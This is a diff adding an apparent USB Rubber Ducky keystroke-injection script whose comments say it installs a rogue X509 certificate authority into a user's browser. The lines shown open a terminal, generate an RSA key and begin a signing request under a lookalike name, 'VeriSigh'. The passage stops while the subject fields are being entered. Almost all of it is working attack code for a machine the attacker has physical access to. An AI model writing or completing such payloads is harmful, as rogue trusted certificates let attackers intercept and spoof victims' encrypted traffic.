@@ -1,0 +1,21 @@
+REM Title: Kali X509 certificate installation
+REM Script that creates a certificate authority and installs a rogue X509 certificate onto a user's browser
+
+REM Open Linux terminal
+DELAY 1000
+ALT F2
+DELAY 50
+STRING gnome-terminal
+DELAY 50
+ENTER
+DELAY 100
+REM Running the certificate creation
+STRING openssl genrsa -out caprivatekey.key 2048
+DELAY 50
+ENTER
+DELAY 3000
+STRING openssl req -new -key caprivatekey.key -out VeriSigh.csr
+DELAY 50
+ENTER
+DELAY 3000
+STRING US
